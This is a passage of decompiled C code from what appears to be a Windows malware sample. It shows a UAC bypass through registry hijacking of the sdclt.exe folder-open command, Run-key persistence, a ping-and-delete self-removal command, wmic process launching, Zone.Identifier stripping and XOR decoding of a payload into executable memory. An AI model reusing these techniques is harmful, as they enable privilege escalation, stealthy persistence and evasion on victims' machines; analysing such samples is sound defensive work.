        function_4043fa((int16_t *)&g322);
        *(int32_t *)(v5 - 28) = (int32_t)L"for /F \"usebackq tokens=*\" %%A in (\"";
        function_40460a((int16_t *)&g322);
        *(int32_t *)(v5 - 32) = a3;
        function_4043fa((int16_t *)&g322);
        *(int32_t *)(v5 - 36) = (int32_t)L":start";
        function_4043fa((int16_t *)&g322);
        *(int32_t *)(v5 - 40) = (int32_t)L"\") do %%A";
        function_4043fa((int16_t *)&g322);
        int32_t v16 = function_4045f0(); // 0x4150ac
        int32_t v17; // bp-32, 0x414eef
        int32_t v18 = &v17; // 0x4150b9
        *(int32_t *)(v5 - 44) = v18;
        function_40456d(&g322);
        *(int32_t *)(v5 - 48) = (int32_t)&v6;
        function_40456d(&g322);
        int32_t * v19 = (int32_t *)(v5 - 52); // 0x4150cd
        *v19 = v16;
        function_415c81((int32_t)&g322);
        function_406f1d();
        function_406f1d();
        function_413915();
        *v19 = (int32_t)&g19;
        function_4043fa((int16_t *)&g322);
        *(int32_t *)(v5 - 56) = (int32_t)L"wmic process call create '\"";
        function_40460a((int16_t *)&g322);
        *(int32_t *)(v5 - 60) = v6;
        function_4043fa((int16_t *)&g322);
        *(int32_t *)(v5 - 64) = (int32_t)L"\"'";
        function_4043fa((int16_t *)&g322);
        *(int32_t *)(v5 - 68) = (int32_t)L":start";
        function_4043fa((int16_t *)&g322);
        int32_t v20 = function_4045f0(); // 0x415138
        int32_t v21; // bp-36, 0x414eef
        *(int32_t *)(v5 - 72) = (int32_t)&v21;
        function_40456d(&g322);
        *(int32_t *)(v5 - 76) = v18;
        function_40456d(&g322);
        int32_t * v22 = (int32_t *)(v5 - 80); // 0x415159
        *v22 = v20;
        function_415c81((int32_t)&g322);
        function_406f1d();
        function_406f1d();
        *v22 = 0;
        *(int32_t *)(v5 - 84) = v6;
        v14 = v5 - 88;
        CopyFileW((int16_t *)&g322, (int16_t *)&g322, (bool)&g322);
        function_406f1d();
        function_406f1d();
        function_406f1d();
        function_406f1d();
    }
    int32_t v23 = v14; // 0x4151ae
    if (a2 != 0) {
        int32_t v24 = v14; // 0x4151b8
        if (v1 == 0) {
            int32_t * v25 = (int32_t *)(lpExistingFileName + 32); // 0x4151ba
            *v25 = 0;
            v24 = v14;
            if (lpExistingFileName != 0) {
                // 0x4151c1
                lstrlenW((int16_t *)&g322);
                int32_t v26 = function_406e8d(); // 0x4151cf
                int32_t v27 = v14 - 12; // 0x4151d5
                *(int32_t *)v27 = v26;
                *v25 = v26;
                lstrcpyW((int16_t *)&g322, (int16_t *)&g322);
                v24 = v27;
            }
        }
        // 0x4151df
        *(int32_t *)(v24 - 4) = 0;
        *(int32_t *)(v24 - 8) = 0x20006;
        *(int32_t *)(v24 - 12) = lpExistingFileName + 20;
        *(int32_t *)(v24 - 16) = *(int32_t *)(lpExistingFileName + 8);
        if (function_414e25(lpExistingFileName + 4, &g322, (int32_t)&g322, (int32_t)&g322) == 0) {
            // 0x415282
            function_406f1d();
            function_406f1d();
            return 0;
        }
        // 0x4151ff
        *(int32_t *)(v24 - 20) = lpExistingFileName + 32;
        int32_t v28 = function_404011((int32_t)&g322); // 0x415206
        *(int32_t *)(v24 - 24) = lpExistingFileName + 92;
        function_404656((int32_t)&g322);
        *(int32_t *)(v24 - 28) = 1;
        *(int32_t *)(v24 - 32) = v28;
        v23 = v24 - 36;
        *(int32_t *)v23 = (int32_t)&v1;
        int32_t v29 = function_414dee((int32_t)&g322, &g322, (int32_t)&g322); // 0x415225
        function_406f1d();
        function_404081();
        if (v29 == 0) {
            // 0x415282
            function_406f1d();
            function_406f1d();
            return 0;
        }
        // 0x415240
        function_414d63();
    }
    // 0x415247
    function_40460a((int16_t *)&g322);
    *(int32_t *)(v23 - 8) = (int32_t)L":Zone.Identifier";
    *(int32_t *)(v23 - 12) = function_40460a((int16_t *)&g322);
    function_4042c5((int32_t)&g322);
    function_406f1d();
    *(int32_t *)(v23 - 16) = v1;
    DeleteFileW((int16_t *)&g322);
    function_406f1d();
    // 0x415282
    function_406f1d();
    function_406f1d();
    return 1;
}

// Address range: 0x41529e - 0x4154ca
int32_t function_41529e(int32_t * a1) {
    int32_t result = (int32_t)a1;
    function_402cac(result);
    int32_t phkResult; // 0x41529e
    *(int32_t *)(phkResult + 8) = (int32_t)(function_413893() != 1) - 0x7ffffffe;
    *(int32_t *)(phkResult + 12) = 5;
    function_4043c7(function_40460a(L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\"));
    function_406f1d();
    function_404656(result + 56);
    int32_t lpsz; // bp-12, 0x41529e
    int32_t v1 = &lpsz; // 0x4152ff
    function_4042c5(v1);
    function_406f1d();
    function_4043c7(function_40460a(L"inst"));
    function_406f1d();
    function_4043c7(function_40460a(L"InitWindows"));
    function_406f1d();
    function_4043c7(function_40460a(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"));
    function_406f1d();
    int32_t lpSubKey = *(int32_t *)(phkResult + 16); // 0x41536f
    int32_t v2 = RegOpenKeyExW(HKEY_CURRENT_USER, (int16_t *)lpSubKey, 0, 0xf003f, (int32_t **)phkResult); // 0x415376
    int32_t * v3 = (int32_t *)(phkResult + 36); // 0x415387
    *v3 = (int32_t)(v2 == 0);
    int32_t v4 = function_413960(); // 0x41538a
    int32_t v5 = v4; // bp-108, 0x41538f
    function_4043c7(v4);
    function_406f1d();
    int32_t v6 = &v5; // 0x4153a6
    if (*(int32_t *)(result + 76) != 0) {
        // 0x4153a8
        function_413915();
        function_4043fa((int16_t *)&g19);
        function_4043c7(function_413960());
        function_406f1d();
        int16_t * lpString2 = CharLowerW((int16_t *)lpsz); // 0x4153e1
        int16_t * lpString1 = CharLowerW((int16_t *)*(int32_t *)(phkResult + 32)); // 0x4153e8
        int16_t * v7 = lpString1; // bp-132, 0x4153eb
        if (lstrcmpW(lpString1, lpString2) == 0) {
            // 0x4153f9
            *v3 = 1;
            // 0x4154c3
            return function_406f1d();
        }
        // 0x41540a
        function_406f1d();
        v6 = (int32_t)&v7;
    }
    // 0x415415
    if (*v3 == 0) {
        // 0x4154c3
        return result;
    }
    int32_t v8 = 0; // bp-20, 0x415424
    int32_t v9 = v6; // 0x41542a
    v8 = 0;
    if (*(int32_t *)(result + 32) != 0) {
        int32_t v10 = &v8; // 0x415431
        *(int32_t *)(v6 - 4) = v10;
        int32_t v11 = v6 - 8; // 0x415435
        *(int32_t *)v11 = phkResult + 24;
        if (function_414d78(v8, 0) == 0) {
            // 0x415491
            *(int32_t *)(phkResult + 40) = 0;
            v9 = v11;
        } else {
            int32_t v12 = v6 - 16; // 0x415440
            int32_t * v13 = (int32_t *)(v6 - 20); // 0x415446
            *v13 = v10;
            function_404094((int32_t)&g322);
            int32_t v14 = v6 - 24; // 0x41544c
            int32_t * v15 = (int32_t *)v14; // 0x41544c
            *v15 = v12;
            int32_t v16 = v6 - 28; // 0x41544d
            *(int32_t *)v16 = v12;
            *(int32_t *)(v6 - 32) = v16;
            function_4069a9(&g322);
            function_40709b((int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322);
            *v13 = v1;
            *v15 = function_403f05((int32_t)&g322);
            function_4043c7((int32_t)&g322);
            function_406f1d();
            lpsz = 0;
            function_404081();
            *(int32_t *)(phkResult + 40) = 1;
            v9 = v14;
        }
    }
    int32_t v17 = result; // 0x41549e
    if (*(int32_t *)(result + 40) != 0) {
        // 0x4154a0
        *(int32_t *)(v9 - 4) = function_413960();
        function_4043c7((int32_t)&g322);
        v17 = function_406f1d();
    }
    int32_t result2 = v17; // 0x4154ba
    if (v8 != 0) {
        // 0x4154bc
        result2 = function_406f66();
    }
    // 0x4154c3
    return result2;
}

// Address range: 0x4154ca - 0x4154ed
int32_t function_4154ca(void) {
    // 0x4154ca
    int32_t result; // 0x4154ca
    *(int32_t *)result = 0;
    *(int32_t *)(result + 4) = 0;
    *(int32_t *)(result + 16) = 0;
    *(int32_t *)(result + 20) = 0;
    *(int32_t *)(result + 24) = 0;
    *(int32_t *)(result + 28) = 0;
    *(int32_t *)(result + 32) = 0;
    function_406ca5();
    return result;
}

// Address range: 0x4154ed - 0x415520
int32_t function_4154ed(int32_t a1, int32_t a2) {
    // 0x4154ed
    int32_t result; // 0x4154ed
    int32_t v1; // 0x4154ed
    if (v1 != 0) {
        // 0x4154fa
        int32_t v2; // bp-12, 0x4154ed
        int32_t v3 = function_40424e((int32_t)&v2); // 0x415503
        function_414dee(a1, (int32_t *)v3, (int32_t)&g322);
        result = function_404081();
    }
    // 0x41551b
    return result;
}

// Address range: 0x415520 - 0x415532
int32_t function_415520(void) {
    // 0x415520
    int32_t result; // 0x415520
    if (result == 0) {
        // 0x41552e
        return result;
    }
    // 0x415528
    return function_414d03(result);
}

// Address range: 0x415532 - 0x4155ce
int32_t function_415532(int32_t * a1, int32_t a2) {
    int32_t v1 = a2;
    int32_t v2 = 0; // bp-16, 0x41553e
    int32_t v3; // 0x415532
    if (v3 == 0) {
        // 0x41554c
        *a1 = 0;
        function_406f1d();
        // 0x4155c7
        return (int32_t)a1;
    }
    // 0x41555c
    if (function_414d78(a2, (int32_t)&v2) != 0) {
        int32_t v4 = function_403f05((int32_t)&v1); // 0x415573
        function_4043c7(v4);
        function_406f1d();
    }
    // 0x41558c
    *a1 = 0;
    function_406f1d();
    if (v2 != 0) {
        // 0x4155c0
        function_406f66();
    }
    // 0x4155c7
    return (int32_t)a1;
}

// Address range: 0x4155ce - 0x4155e3
int32_t function_4155ce(int32_t result) {
    // 0x4155ce
    function_413915();
    return result;
}

// Address range: 0x4155e3 - 0x41570e
int32_t function_4155e3(void) {
    // 0x4155e3
    int32_t v1; // 0x4155e3
    function_414ce8(v1, v1, v1);
    int32_t v2 = function_406a56(); // 0x4155fe
    int32_t v3; // bp-884, 0x4155e3
    int32_t * v4 = &v3; // 0x415605
    if (v2 != 0) {
        int32_t v5 = g192; // bp-892, 0x415609
        TerminateThread((int32_t *)g192, 0);
        v4 = &v5;
    }
    int32_t v6 = (int32_t)v4;
    int32_t v7 = v6; // 0x41561e
    if (function_406a8a() != 0) {
        // 0x415620
        *(int32_t *)(v6 - 4) = 0;
        *(int32_t *)(v6 - 8) = 0x20006;
        *(int32_t *)(v6 - 12) = v1 + 20;
        *(int32_t *)(v6 - 16) = *(int32_t *)(v1 + 8);
        function_414e25((int32_t)&g322, &g322, (int32_t)&g322, (int32_t)&g322);
        int32_t v8; // bp-8, 0x4155e3
        *(int32_t *)(v6 - 20) = (int32_t)&v8;
        int32_t v9 = function_406a70((int32_t)&g322); // 0x41563e
        v7 = v6 - 24;
        *(int32_t *)v7 = v9;
        function_414d03((int32_t)&g322);
        function_4043b8();
        function_414d63();
    }
    int32_t * v10 = (int32_t *)(v7 - 4); // 0x41565a
    *v10 = 68;
    int32_t * v11 = (int32_t *)(v7 - 8); // 0x415661
    *v11 = 0;
    int32_t * v12 = (int32_t *)(v7 - 12); // 0x415662
    int32_t v13; // bp-92, 0x4155e3
    int32_t v14 = &v13; // 0x415662
    *v12 = v14;
    function_401293(&g322, (int32_t)&g322, (int32_t)&g322);
    int32_t hModule; // bp-24, 0x4155e3
    int32_t v15 = &hModule; // 0x41566a
    hModule = 0;
    bool v16; // 0x4155e3
    int32_t v17 = v16 ? -4 : 4; // 0x41566d
    int32_t v18 = v17 + v15; // 0x41566d
    *(int32_t *)v18 = 0;
    int32_t v19 = v18 + v17; // 0x415671
    *v10 = 260;
    *(int32_t *)v19 = 0;
    *(int32_t *)(v19 + v17) = 0;
    int32_t v20; // bp-352, 0x4155e3
    int32_t v21 = &v20; // 0x41567f
    *v11 = v21;
    *v12 = 0;
    GetModuleFileNameA((int32_t *)hModule, (char *)&g322, (int32_t)&g322);
    int32_t * v22 = (int32_t *)(v7 - 16); // 0x415687
    *v22 = 13;
    int32_t v23; // bp-872, 0x4155e3
    __asm_rep_movsd_memcpy((char *)&v23, "cmd.exe /C ping 1.2.3.4 -n 2 -w 1000 > Nul & Del /f /q ", 13);
    *v22 = 34;
    int32_t v24 = v21; // 0x4156a9
    while (*(char *)v24 != 0) {
        // 0x4156ac
        v24++;
    }
    // 0x4156b3
    int32_t v25; // bp-351, 0x4155e3
    int32_t v26 = v24 - (int32_t)&v25; // 0x4156b3
    *v22 = v26;
    int32_t * v27 = (int32_t *)(v7 - 20); // 0x4156bc
    *v27 = v21;
    int32_t * v28 = (int32_t *)(v7 - 24); // 0x4156c3
    int32_t v29; // bp-816, 0x4155e3
    *v28 = (int32_t)&v29;
    function_40126d(&g322, &g322, (int32_t)&g322);
    int32_t v30; // bp-4, 0x4155e3
    *(int16_t *)((int32_t)&v30 - 812 + v26) = 34;
    *v22 = v15;
    *v27 = v14;
    *v28 = 0;
    *(int32_t *)(v7 - 28) = 0;
    *(int32_t *)(v7 - 32) = 0x8000000;
    *(int32_t *)(v7 - 36) = 0;
    *(int32_t *)(v7 - 40) = 0;
    *(int32_t *)(v7 - 44) = 0;
    *(int32_t *)(v7 - 48) = (int32_t)&v23;
    *(int32_t *)(v7 - 52) = 0;
    CreateProcessA((char *)&g322, (char *)&g322, (struct _SECURITY_ATTRIBUTES *)&g322, (struct _SECURITY_ATTRIBUTES *)&g322, (bool)&g322, (int32_t)&g322, &g322, (char *)&g322, (struct _STARTUPINFOA *)&g322, (struct _PROCESS_INFORMATION *)&g322);
    CloseHandle(&g322);
    *(int32_t *)(v7 - 60) = hModule;
    CloseHandle(&g322);
    *(int32_t *)(v7 - 64) = 0;
    ExitProcess((int32_t)&g322);
    // UNREACHABLE
}

// Address range: 0x41570f - 0x415774
int32_t function_41570f(int32_t lpValueName, int32_t * lpString) {
    int32_t cbData = lstrlenA((char *)lpString); // 0x415717
    int32_t phkResult; // bp-8, 0x41570f
    int32_t v1 = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\Folder\\shell\\open\\command", 0, 0x20006, (int32_t **)&phkResult); // 0x415734
    int32_t result; // 0x41570f
    if (v1 != 0) {
        // 0x41573f
        SetLastError((int32_t)&g322);
        result = (int32_t)&g322 & -256 | (int32_t)((char)&g322 ^ (char)&g322);
        // 0x415771
        return result;
    }
    int32_t v2 = RegSetValueExA((int32_t *)phkResult, (char *)lpValueName, 0, 1, (char *)lpString, cbData); // 0x415757
    int32_t v3 = RegCloseKey((int32_t *)phkResult); // 0x415762
    if (v2 == 0) {
        // 0x415771
        return v3 & -256 | 1;
    }
    // 0x41573f
    SetLastError((int32_t)&g322);
    result = (int32_t)&g322 & -256 | (int32_t)((char)&g322 ^ (char)&g322);
    // 0x415771
    return result;
}

// Address range: 0x415774 - 0x4157f0
int32_t function_415774(void) {
    // 0x415774
    int32_t pSecurityDescriptor; // bp-44, 0x415774
    if (!InitializeSecurityDescriptor(&pSecurityDescriptor, 1) || !SetSecurityDescriptorDacl(&pSecurityDescriptor, true, NULL, false)) {
        // 0x4157ed
        return 0;
    }
    int32_t lpSecurityAttributes = 12; // bp-24, 0x4157a2
    int32_t lpdwDisposition; // bp-12, 0x415774
    int32_t phkResult; // bp-8, 0x415774
    int32_t dwErrCode = RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\Folder\\shell\\open\\command", 0, NULL, 0, 0x20006, (struct _SECURITY_ATTRIBUTES *)&lpSecurityAttributes, (int32_t **)&phkResult, &lpdwDisposition); // 0x4157cd
    int32_t result; // 0x415774
    if (dwErrCode != 0) {
        // 0x4157e4
        SetLastError(dwErrCode);
        result = (int32_t)&g322 & -256;
    } else {
        // 0x4157d7
        result = RegCloseKey((int32_t *)phkResult) & -256 | 1;
    }
    // 0x4157ed
    return result;
}

// Address range: 0x4157f0 - 0x415884
int32_t function_4157f0(void) {
    int32_t lpAddress = function_401000(2048); // 0x415801
    int32_t v1 = lpAddress; // 0x415813
    int32_t lpAddress2 = 1537; // 0x415813
    char v2 = *(char *)((int32_t)&g110 - lpAddress + v1); // 0x415818
    *(char *)v1 = v2 ^ 69;
    lpAddress2--;
    v1++;
    while (lpAddress2 != 0) {
        // 0x415818
        v2 = *(char *)((int32_t)&g110 - lpAddress + v1);
        *(char *)v1 = v2 ^ 69;
        lpAddress2--;
        v1++;
    }
    // 0x415826
    int32_t lpflOldProtect; // bp-16, 0x4157f0
    VirtualProtect((int32_t *)lpAddress, 2000, 64, &lpflOldProtect);
    int32_t * memory = VirtualAlloc((int32_t *)lpAddress2, 510, 0x1000, 64); // 0x415845
    GetWindowsDirectoryW((int16_t *)memory, 260);
    int32_t v3 = lstrlenW((int16_t *)memory); // 0x41585a
    __asm_rep_movsd_memcpy((char *)(2 * v3 + (int32_t)memory), (char *)&g121, 10);
    return lpAddress + 239;
}

// Address range: 0x415884 - 0x4158f7
int32_t function_415884(int32_t a1) {
    int32_t v1 = -0x7fffffff; // bp-44, 0x41589f
    int32_t phkResult; // bp-8, 0x415884
    int32_t v2 = RegOpenKeyExW(HKEY_CURRENT_USER, (int16_t *)&g120, 0, 0xf003f, (int32_t **)&phkResult); // 0x4158a4
    int32_t * v3 = &v1; // 0x4158ac
    if (v2 != 0) {
        int32_t v4 = -0x7fffffff; // bp-80, 0x4158bc
        int32_t lpdwDisposition; // bp-12, 0x415884
        RegCreateKeyExW(HKEY_CURRENT_USER, (int16_t *)&g120, 0, NULL, 0, 0xf003f, NULL, (int32_t **)&phkResult, &lpdwDisposition);
        v3 = &v4;
    }
    int32_t v5 = (int32_t)v3;
    *(int32_t *)(v5 - 4) = (int32_t)&g193;
    *(int32_t *)(v5 - 8) = 4 * lstrlenW((int16_t *)&g322);
    *(int32_t *)(v5 - 12) = (int32_t)&g193;
    *(int32_t *)(v5 - 16) = 1;
    *(int32_t *)(v5 - 20) = 0;
    *(int32_t *)(v5 - 24) = (int32_t)L"Install";
    *(int32_t *)(v5 - 28) = phkResult;
    RegSetValueExW(&g322, (int16_t *)&g322, (int32_t)&g322, (int32_t)&g322, (char *)&g322, (int32_t)&g322);
    *(int32_t *)(v5 - 32) = phkResult;
    return RegCloseKey(&g322);
}

// Address range: 0x4158f7 - 0x415974
int32_t function_4158f7(void) {
    // 0x4158f7
    function_401293((int32_t *)&g193, 0, 520);
    GetModuleFileNameW(NULL, (int16_t *)&g193, 520);
    if (IsUserAnAdmin() || function_413893() == 1) {
        // 0x41596f
        return 0;
    }
    // 0x41592d
    int32_t v1; // 0x4158f7
    function_415884(v1);
    int32_t * hModule = (int32_t *)function_415c0e(); // 0x415942
    int32_t * hResInfo = FindResourceW(hModule, (int16_t *)102, (int16_t *)0x41c714); // 0x415942
    int32_t * hResData = LoadResource(hModule, hResInfo); // 0x41594c
    SizeofResource(hModule, hResInfo);
    if (LockResource(hResData) != NULL) {
        // 0x415968
        function_4157f0();
    }
    // 0x41596f
    return 0;
}

// Address range: 0x415974 - 0x415b63
int32_t function_415974(void) {
    // 0x415974
    if (function_413893() == 1) {
        // 0x4159d8
        return 0;
    }
    // 0x41598a
    function_413915();
    function_4043fa((int16_t *)&g19);
    function_413960();
    int32_t lpsz; // 0x415974
    if (lstrcmpW(CharLowerW((int16_t *)lpsz), CharLowerW((int16_t *)lpsz)) == 0) {
        // 0x4159c8
        function_406f1d();
        function_406f1d();
        // 0x4159d8
        return 0;
    }
    // 0x4159df
    CloseHandle((int32_t *)g175);
    IsWow64Process(GetCurrentProcess(), (bool *)&g322);
    function_415774();
    int32_t lpFilename; // bp-2324, 0x415974
    function_401293(&lpFilename, 0, 1024);
    GetModuleFileNameA(NULL, (char *)&lpFilename, 1024);
    function_41570f((int32_t)&g119, &lpFilename);
    function_41570f((int32_t)"DelegateExecute", (int32_t *)&g119);
    int32_t lpBuffer; // bp-1300, 0x415974
    GetSystemDirectoryW((int16_t *)&lpBuffer, 260);
    lstrcatW((int16_t *)&lpBuffer, L"\\sdclt.exe");
    GetLastError();
    int32_t v1; // bp-184, 0x415974
    function_401293(&v1, 0, 68);
    int32_t lpStartupInfo; // bp-260, 0x415974
    __asm_rep_movsd_memcpy((char *)&lpStartupInfo, (char *)&v1, 17);
    int32_t v2 = 0; // bp-52, 0x415aa9
    bool v3; // 0x415974
    int32_t v4 = v3 ? -4 : 4; // 0x415aa9
    int32_t v5 = v4 + (int32_t)&v2; // 0x415aa9
    int32_t * v6 = (int32_t *)v5; // 0x415ab5
    *v6 = 0;
    int32_t v7 = v5 + v4; // 0x415ab5
    int32_t * v8 = (int32_t *)v7; // 0x415ab6
    *v8 = 0;
    int32_t * v9 = (int32_t *)(v7 + v4); // 0x415ab7
    *v9 = 0;
    int32_t lpProcessInformation = v2; // bp-36, 0x415ac1
    int32_t v10 = v4 + (int32_t)&lpProcessInformation; // 0x415ac1
    *(int32_t *)v10 = *v6;
    int32_t v11 = v10 + v4; // 0x415ac2
    *(int32_t *)v11 = *v8;
    *(int32_t *)(v11 + v4) = *v9;
    int32_t lpCommandLine; // bp-780, 0x415974
    __asm_rep_movsd_memcpy((char *)&lpCommandLine, "cmd.exe /C C:\\Windows\\System32\\sdclt.exe", 10);
    int32_t v12; // bp-739, 0x415974
    function_401293(&v12, 0, (int32_t)&g322);
    Sleep(0x4e20);
    CreateProcessA(NULL, (char *)&lpCommandLine, NULL, NULL, false, 0, NULL, NULL, (struct _STARTUPINFOA *)&lpStartupInfo, (struct _PROCESS_INFORMATION *)&lpProcessInformation);
    CloseHandle((int32_t *)lpsz);
    CloseHandle((int32_t *)lpProcessInformation);
    int32_t lpOut; // bp-116, 0x415974
    wsprintfW((int16_t *)&lpOut, L"%d");
    TerminateProcess((int32_t *)lpsz, 0);
    Sleep(2000);
    RegDeleteKeyA((int32_t *)-0x7fffffff, "Software\\Classes\\Folder\\shell\\open\\command");
    ExitProcess(0);
    // UNREACHABLE
}

// Address range: 0x415b64 - 0x415c0e
int32_t function_415b64(int32_t a1, int32_t * a2) {
    // 0x415b64
    int32_t v1; // 0x415b64
    int32_t v2 = v1;
    int32_t v3 = (v2 >> 31) % 4 + v2; // 0x415b72
    int32_t v4 = v3 >> 2; // 0x415b78
    int32_t v5 = (v3 & -4) + v1; // 0x415b7b
    int32_t v6 = a1; // 0x415b80
    if (v4 != 0) {
        int32_t v7 = -v4; // 0x415ba0
        int32_t v8 = *(int32_t *)(4 * v7 + v5); // 0x415b82
        uint32_t v9 = 0x1b873593 * (-0x3361d2af * v8 / 0x20000 | 0x16a88000 * v8) ^ a1; // 0x415b92
        int32_t v10 = 5 * (v9 / 0x80000 | 0x2000 * v9) - 0x19ab949c; // 0x415b9a
        v7++;
        v6 = v10;
        while (v7 != 0) {
            // 0x415b82
            v8 = *(int32_t *)(4 * v7 + v5);
            v9 = 0x1b873593 * (-0x3361d2af * v8 / 0x20000 | 0x16a88000 * v8) ^ v10;
            v10 = 5 * (v9 / 0x80000 | 0x2000 * v9) - 0x19ab949c;
            v7++;
            v6 = v10;
        }
    }
    uint32_t v11 = v2 % 4; // 0x415ba9
    int32_t v12 = 0; // 0x415baf
    int32_t v13; // 0x415b64
    int32_t v14; // 0x415b64
    if (v11 == 1) {
        goto lab_0x415bcb;
    } else {
        int32_t v15 = v11 - 2; // 0x415bb1
        v13 = 0;
        if (v15 == 0) {
            goto lab_0x415bc2;
        } else {
            // 0x415bb6
            v14 = v6;
            if (v15 != 1) {
                goto lab_0x415be1;
            } else {
                // 0x415bbb
                v13 = 0x10000 * (int32_t)*(char *)(v5 + 2);
                goto lab_0x415bc2;
            }
        }
    }
  lab_0x415bcb:;
    int32_t v16 = v12 ^ (int32_t)*(char *)v5; // 0x415bce
    v14 = 0x1b873593 * (-0x3361d2af * v16 / 0x20000 | 0x16a88000 * v16) ^ v6;
    goto lab_0x415be1;
  lab_0x415be1:;
    uint32_t v17 = v14 ^ v2; // 0x415be1
    uint32_t v18 = -0x7a143595 * (v17 / 0x10000 ^ v17); // 0x415bea
    uint32_t v19 = -0x3d4d51cb * (v18 / 0x2000 ^ v18); // 0x415bfa
    *a2 = v19 / 0x10000 ^ v19;
    return (int32_t)a2;
  lab_0x415bc2:
    // 0x415bc2
    v12 = 256 * (int32_t)*(char *)(v5 + 1) | v13;
    goto lab_0x415bcb;
}

// Address range: 0x415c0e - 0x415c2e
int32_t function_415c0e(void) {
    int32_t result = 0x415c0e; // 0x415c17
    while (*(int32_t *)result != 0x905a4d) {
        // 0x415c1e
        result--;
    }
    // 0x415c2a
    return result;
}

// Address range: 0x415c2e - 0x415c58
int32_t function_415c2e(void) {
    // 0x415c2e
    int32_t v1; // bp-8, 0x415c2e
    int32_t * v2 = (int32_t *)((int32_t)&v1 - 4); // 0x415c34
    int32_t v3; // 0x415c2e
    uint32_t v4; // 0x415c35
    unsigned char v5; // 0x415c42
    for (int32_t i = 0; i < 10; i++) {
        // 0x415c34
        *v2 = i;
        v4 = function_415c58((int32_t)&g322);
        *v2 = 62;
        v5 = *(char *)(v4 % 62 + (int32_t)"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");
        *(char *)(i + v3) = v5;
    }
    // 0x415c51
    *(char *)(v3 + 10) = 0;
    return v4 / 62 & 0x7fffff00 | (int32_t)v5;
}

// Address range: 0x415c58 - 0x415c81
int32_t function_415c58(int32_t a1) {
    // 0x415c58
    Sleep(1);
    return GetTickCount() * (857 * a1 + 1) % 0x2710;
}

// Address range: 0x415c81 - 0x415cc4
int32_t function_415c81(int32_t nNumberOfBytesToWrite) {
    int32_t lpNumberOfBytesWritten = 0; // bp-8, 0x415c98
    int32_t lpFileName; // 0x415c81
    int32_t * fileHandle = CreateFileA((char *)lpFileName, 0x40000000, 0, NULL, 2, 0, NULL); // 0x415c9b
    int32_t handleClosed = (int32_t)fileHandle; // 0x415ca6
    if (fileHandle != (int32_t *)-1) {
        // 0x415ca8
        WriteFile(fileHandle, (int32_t *)lpFileName, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, NULL);
        handleClosed = CloseHandle(fileHandle);
    }
    // 0x415cbf
    return handleClosed;
}

// Address range: 0x415cc4 - 0x415d7c
int32_t function_415cc4(int32_t a1) {
    // 0x415cc4
    int32_t v1; // 0x415cc4
    int32_t * v2 = (int32_t *)v1; // 0x415cdc
    function_401293(v2, 153, 1024);
    int32_t v3 = a1; // 0x415ce9
    while (*(int16_t *)v3 != 0) {
        // 0x415cec
        v3 += 2;
    }
    int32_t v4 = function_401098((int32_t)&g80, L"Default"); // 0x415d06
    if (v4 == 0) {
        // 0x415d77
        return 0;
    }
    int32_t v5 = v3 + -2 - a1; // 0x415cf7
    int32_t v6 = v4 - (int32_t)&g80 & -2;
    function_40126d(v2, (int32_t *)&g80, v6);
    function_40126d((int32_t *)(v6 + v1), (int32_t *)a1, v5 & -2);
    int32_t v7 = v4 + 14; // 0x415d3e
    int32_t v8 = v7; // 0x415d48
    while (*(int16_t *)v8 != 0) {
        // 0x415d4b
        v8 += 2;
    }
    // 0x415d77
    return function_40126d((int32_t *)((v6 + v5 & -2) + v1), (int32_t *)v7, -14 - v4 + v8 & -2);
}

// Address range: 0x415d7c - 0x415dbf
int32_t function_415d7c(int32_t nNumberOfBytesToWrite) {
    int32_t lpNumberOfBytesWritten = 0; // bp-8, 0x415d93
    int32_t lpFileName; // 0x415d7c
    int32_t * hFile = CreateFileW((int16_t *)lpFileName, 0x40000000, 0, NULL, 2, 0, NULL); // 0x415d96
    int32_t handleClosed = (int32_t)hFile; // 0x415da1
    if (hFile != (int32_t *)-1) {
        // 0x415da3
        WriteFile(hFile, (int32_t *)lpFileName, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, NULL);
        handleClosed = CloseHandle(hFile);
    }
    // 0x415dba
    return handleClosed;
}

// Address range: 0x415dbf - 0x415dc4
int32_t function_415dbf(void) {
    // 0x415dbf
    return function_415c0e();
}

// Address range: 0x415dc4 - 0x415e24
int32_t function_415dc4(int32_t a1) {
    // 0x415dc4
    int32_t result; // 0x415dc4
    *(int32_t *)result = 0;
    if (a1 != 0) {
        int32_t v1 = a1 + 2; // 0x415dd9
        int32_t v2 = function_401000(v1); // 0x415dde
        int32_t * v3 = (int32_t *)v2; // 0x415de9
        function_401293(v3, 0, v1);
        function_40126d(v3, (int32_t *)result, a1);
        function_4043c7(function_40460a((int16_t *)v2));
        function_406f1d();
        function_401014(v2);
    }
    // 0x415e1f
    return result;
}

// Address range: 0x415e24 - 0x415e27
int32_t function_415e24(void) {
    // 0x415e24
    int32_t result; // 0x415e24
    return result;
}

// Address range: 0x415e27 - 0x415e92
int32_t function_415e27(void) {
    int32_t lpBuffer = function_401000(0x2800000); // 0x415e37
    int32_t lpNumberOfBytesRead = 0; // bp-8, 0x415e51
    int32_t lpFileName; // 0x415e27
    int32_t * fileHandle = CreateFileA((char *)lpFileName, -0x80000000, 0, NULL, 3, 128, NULL); // 0x415e54
    int32_t * v1 = (int32_t *)lpFileName;
    if (fileHandle == (int32_t *)-1) {
        // 0x415e61
        *v1 = 0;
    }
    int32_t nNumberOfBytesToRead = GetFileSize(fileHandle, NULL); // 0x415e67
    *v1 = nNumberOfBytesToRead;
    bool v2 = ReadFile(fileHandle, (int32_t *)lpBuffer, nNumberOfBytesToRead, &lpNumberOfBytesRead, NULL); // 0x415e78
    if (!v2) {
        // 0x415e82
        *v1 = v2 ? lpFileName : 0;
    }
    // 0x415e84
    CloseHandle(fileHandle);
    return lpBuffer;
}

// Address range: 0x415e92 - 0x415ede
int32_t function_415e92(void) {
    // 0x415e92
    int32_t v1; // 0x415e92
    uint32_t dwSize = v1;
    int32_t * memory = VirtualAlloc(NULL, dwSize, 0x1000, 4); // 0x415eac
    int32_t result = (int32_t)memory; // 0x415eac
    int32_t v2 = dwSize - 1 + v1; // 0x415eba
    int32_t v3 = 0; // 0x415eba
    *(char *)(v3 + result) = -1 - *(char *)v2;
    v3++;
    v2--;
    while (v3 <= dwSize) {
        // 0x415ebc
